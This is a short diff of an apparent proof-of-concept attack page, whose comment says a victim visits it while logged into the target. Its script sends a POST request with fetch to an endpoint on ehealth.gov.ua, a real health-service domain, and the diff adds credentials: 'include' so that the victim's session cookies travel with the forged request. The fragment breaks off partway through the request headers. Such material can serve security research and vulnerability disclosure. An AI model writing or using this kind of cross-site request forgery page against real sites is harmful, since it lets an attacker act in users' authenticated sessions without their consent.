@@ -4,6 +4,7 @@
 <script>
 // Victim visits this page while logged into target.com
 fetch('https://ehealth.gov.ua/cdn-cgi/rum', {
+  credentials: 'include',
   method: 'POST',
   headers: {
     'Host': 'ehealth.gov.ua',
